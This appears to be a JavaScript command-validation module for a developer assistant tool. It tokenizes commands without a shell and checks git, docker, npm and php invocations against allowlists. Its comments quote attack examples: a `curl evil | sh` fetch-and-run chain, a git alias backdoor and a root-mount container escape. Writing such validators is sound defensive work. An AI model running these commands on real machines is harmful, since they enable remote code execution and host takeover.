// The real security boundary for every command Companion ever runs on the
// user's machine. Previously this was `exec(rawString)` behind a
// `startsWith(prefix)` check — a real shell interpreting the whole string,
// gated only by which word it started with. `npm install && curl evil | sh`
// passes that check today because it starts with "npm ".
//
// This module never invokes a shell. It parses a command string into a real
// argv array (respecting quotes, the way a shell would when *reading* the
// string, without ever handing it to one), rejects any shell metacharacter
// found outside quotes, and validates the resulting [binary, ...args] against
// an explicit per-binary schema before anything is allowed to execute.

// Longest patterns first so `&&`/`||`/`>>` aren't mistaken for their
// single-character prefixes. A lone `&` (background execution) is rejected
// too, even though it's inert once shell:false is in effect — silently
// passing it through as a meaningless extra argument to the real binary
// would just surface as a confusing tool-specific error; rejecting it
// upfront with a clear reason is better UX and a clearer signal that
// someone attempted shell syntax.
const SHELL_OPERATOR_PATTERN = /^(&&|\|\||>>|\$\(|[;|><&`])/;

/**
 * Walks the raw string tracking single/double-quote state and reports the
 * first shell metacharacter found *outside* a quoted region. Content inside
 * quotes is inert once passed as a single argv element to execFile/spawn
 * with shell:false regardless of what characters it contains — this check
 * exists so a chaining/injection *attempt* is rejected with a clear reason
 * instead of silently becoming a confusing, do-nothing literal argument.
 */
function findUnquotedShellOperator(command) {
  const input = String(command || "");
  let inSingle = false;
  let inDouble = false;

  for (let i = 0; i < input.length; i++) {
    const ch = input[i];

    if (inSingle) {
      if (ch === "'") inSingle = false;
      continue;
    }
    if (inDouble) {
      if (ch === '"') inDouble = false;
      else if (ch === "\\") i++; // skip the escaped character
      continue;
    }
    if (ch === "'") {
      inSingle = true;
      continue;
    }
    if (ch === '"') {
      inDouble = true;
      continue;
    }
    // Deliberately no unquoted-backslash escaping here (see tokenize()'s
    // comment) — an ordinary Windows path like C:\Users\project must not be
    // treated as an escape sequence.

    const match = input.slice(i).match(SHELL_OPERATOR_PATTERN);
    if (match) return match[0];
  }

  return null;
}

/**
 * Tokenizes a command string into argv — quotes group words, and inside
 * double quotes a backslash escapes `"`, `\`, `$`, and backtick (the usual
 * shell-quoting convention, needed so a generated commit message can safely
 * contain an escaped quote). Outside quotes, backslash is deliberately left
 * as an ordinary literal character rather than a POSIX-style escape: this
 * runs on Windows as a primary target, where unquoted arguments routinely
 * contain single backslashes as path separators (`C:\Users\project`) that
 * must survive untouched, not be silently eaten as escape characters. This
 * never executes anything itself — the result is a plain string array,
 * handed directly to execFile/spawn with shell:false so none of it is ever
 * re-interpreted by anything.
 */
function tokenize(command) {
  const input = String(command || "");
  const tokens = [];
  let current = "";
  let tokenStarted = false;
  let inSingle = false;
  let inDouble = false;

  const pushCurrent = () => {
    if (tokenStarted) tokens.push(current);
    current = "";
    tokenStarted = false;
  };

  for (let i = 0; i < input.length; i++) {
    const ch = input[i];

    if (inSingle) {
      if (ch === "'") inSingle = false;
      else current += ch;
      continue;
    }
    if (inDouble) {
      if (ch === '"') {
        inDouble = false;
      } else if (ch === "\\" && i + 1 < input.length && '"\\$`'.includes(input[i + 1])) {
        current += input[++i];
      } else {
        current += ch;
      }
      continue;
    }
    if (ch === "'") {
      inSingle = true;
      tokenStarted = true;
      continue;
    }
    if (ch === '"') {
      inDouble = true;
      tokenStarted = true;
      continue;
    }
    // No unquoted-backslash escaping — see the doc comment above.
    if (/\s/.test(ch)) {
      pushCurrent();
      continue;
    }

    current += ch;
    tokenStarted = true;
  }

  if (inSingle || inDouble) {
    throw new Error("Unterminated quote in command.");
  }
  pushCurrent();

  return tokens;
}

// Interpreters where "the subcommand IS arbitrary user/generated code" is the
// tool's actual job (npx fetches and runs a package by name; python/pip take
// arbitrary scripts/packages) — these can't be schema-validated the way a
// fixed-subcommand CLI like git can. They stay allowed because real,
// load-bearing product flows depend on them (the Testing Agent runs
// `npx jest ...`/`npx vitest ...`/`python -m pytest ...`), but this is a
// real, inherent, and irreducible residual risk: anyone who can reach this
// endpoint can ask one of these interpreters to run arbitrary code, by
// design of the interpreter itself. Shell injection/chaining is still fully
// closed for them (no `&&`, no shell at all) — this is about what the
// *first* command alone can do, not about chaining further commands onto it.
const OPEN_INTERPRETERS = new Set(["npx", "python", "python3", "pip", "pip3"]);

// Tools with no specific dangerous-subcommand pattern found in the audit,
// and too varied a CLI surface to enumerate meaningfully — validated only
// for "no shell metacharacters", same as everything else.
const LIGHT_TOUCH_BINARIES = new Set(["dotnet", "go", "cargo", "flutter", "vercel", "railway", "amplify"]);

function hasFlag(args, names) {
  return args.some((a) => names.includes(a) || names.some((n) => a.startsWith(`${n}=`)));
}

const GIT_SCHEMA = {
  // The exact backdoor vector the audit found: `git config alias.x '!<shell
  // command>'` plants a persistent alias that later runs as an ordinary-
  // looking `git x`. No real DevPlan flow calls `git config` or `git alias`
  // at all (confirmed by searching every real call site in the frontend) —
  // there is nothing to preserve by allowing it.
  denySubcommands: new Set(["config", "alias"]),
  subcommands: new Set([
    "init", "status", "add", "commit", "diff", "log", "rev-parse", "checkout",
    "branch", "clone", "fetch", "pull", "push", "stash", "reset", "show",
    "remote", "merge", "clean", "rev-list", "ls-files", "describe",
  ]),
  validateArgs(subcommand, args) {
    if (subcommand === "push" && hasFlag(args, ["--force", "-f", "--force-with-lease"])) {
      return "git push --force is not allowed — a force-push can silently discard remote history.";
    }
    return null;
  },
};

const DOCKER_SCHEMA = {
  subcommands: new Set([
    "build", "push", "run", "ps", "images", "stop", "start", "restart", "rm",
    "rmi", "logs", "exec", "compose", "pull", "network", "volume", "inspect",
  ]),
  validateArgs(subcommand, args) {
    if (hasFlag(args, ["--privileged", "--cap-add", "--pid=host", "--pid", "--network=host"])) {
      return "This docker flag grants host-level access and is not allowed.";
    }
    // Bind-mounting the filesystem root (host escape via `-v /:/host`, or a
    // Windows drive root) is the exact container-escape pattern the audit
    // found. Docker's `HOST:CONTAINER[:MODE]` syntax uses ':' as its own
    // separator, which collides with the colon a Windows path already has
    // after its drive letter (`C:\...`) — a naive `spec.split(":")[0]`
    // mis-parses that ambiguity. Testing the whole spec against two
    // anchored patterns instead avoids that: a POSIX root mount is exactly
    // "/" followed immediately by docker's separator colon, and a Windows
    // drive-root mount is a drive letter + colon + a single separator
    // character followed immediately by docker's separator colon — in both
    // cases, "immediately followed by the next colon" is what distinguishes
    // a bare root from a real subdirectory path like C:\Users\project.
    const mountFlagIndex = args.findIndex((a) => a === "-v" || a === "--volume");
    if (mountFlagIndex !== -1) {
      const spec = args[mountFlagIndex + 1] || "";
      const isPosixRootMount = /^\/:/.test(spec);
      const isWindowsDriveRootMount = /^[A-Za-z]:[\\/]:/.test(spec);
      if (isPosixRootMount || isWindowsDriveRootMount) {
        return "Mounting the filesystem root into a container is not allowed.";
      }
    }
    return null;
  },
};

const NPM_LIKE_SCHEMA = {
  subcommands: new Set([
    "install", "ci", "run", "run-script", "test", "build", "start", "list",
    "ls", "outdated", "audit", "uninstall", "update", "init", "publish",
    "version", "dedupe", "prune",
  ]),
};

const PHP_SCHEMA = {
  // `php artisan ...` is the one real, load-bearing php invocation in the
  // whole product (TestRunnerService's PHPUnit runner uses it); arbitrary
  // `php <script>.php` execution has no current legitimate call site, so it
  // isn't opened up — narrower than the old "any `php ` prefix" allowlist.
  subcommands: new Set(["artisan", "-v", "--version", "-m"]),
};

const COMPOSER_SCHEMA = {
  subcommands: new Set(["install", "require", "update", "audit", "dump-autoload", "remove", "show", "outdated"]),
};

const SCHEMAS = {
  git: GIT_SCHEMA,
  docker: DOCKER_SCHEMA,
  npm: NPM_LIKE_SCHEMA,
  pnpm: NPM_LIKE_SCHEMA,
  yarn: NPM_LIKE_SCHEMA,
  composer: COMPOSER_SCHEMA,
  php: PHP_SCHEMA,
};

/**
 * Parses and validates a command string end to end. Returns
 * `{ ok: true, binary, args }` (ready for execFile/spawn(binary, args,
 * {shell:false})) or `{ ok: false, reason }` with a specific, user-facing
 * reason — never a silent generic rejection.
 */
function validateCommand(command) {
  const trimmed = String(command || "").trim();
  if (!trimmed) {
    return { ok: false, reason: "No command given." };
  }

  const operator = findUnquotedShellOperator(trimmed);
  if (operator) {
    return {
      ok: false,
      reason: `Shell operators are not supported here ("${operator}" found) — commands run directly, without a shell, so chaining/redirection/piping can't work. Run each command separately.`,
    };
  }

  let argv;
  try {
    argv = tokenize(trimmed);
  } catch (err) {
    return { ok: false, reason: err.message };
  }

  const [binary, subcommand, ...rest] = argv;
  if (!binary) {
    return { ok: false, reason: "No command given." };
  }

  if (OPEN_INTERPRETERS.has(binary) || LIGHT_TOUCH_BINARIES.has(binary)) {
    return { ok: true, binary, args: argv.slice(1) };
  }

  const schema = SCHEMAS[binary];
  if (!schema) {
    return {
      ok: false,
      reason: `Command not allowed: "${binary}". Only npm/pnpm/yarn/npx/git/composer/pip/python/php/dotnet/go/cargo/flutter/docker/vercel/railway/amplify commands can run here.`,
    };
  }

  if (!subcommand) {
    return { ok: false, reason: `"${binary}" needs a subcommand.` };
  }
  if (schema.denySubcommands?.has(subcommand)) {
    return { ok: false, reason: `"${binary} ${subcommand}" is not allowed.` };
  }
  if (!schema.subcommands.has(subcommand)) {
    return { ok: false, reason: `"${binary} ${subcommand}" is not a recognized/allowed subcommand.` };
  }

  const argError = schema.validateArgs?.(subcommand, rest);
  if (argError) {
    return { ok: false, reason: argError };
  }

  return { ok: true, binary, args: argv.slice(1) };
}

module.exports = { tokenize, findUnquotedShellOperator, validateCommand };
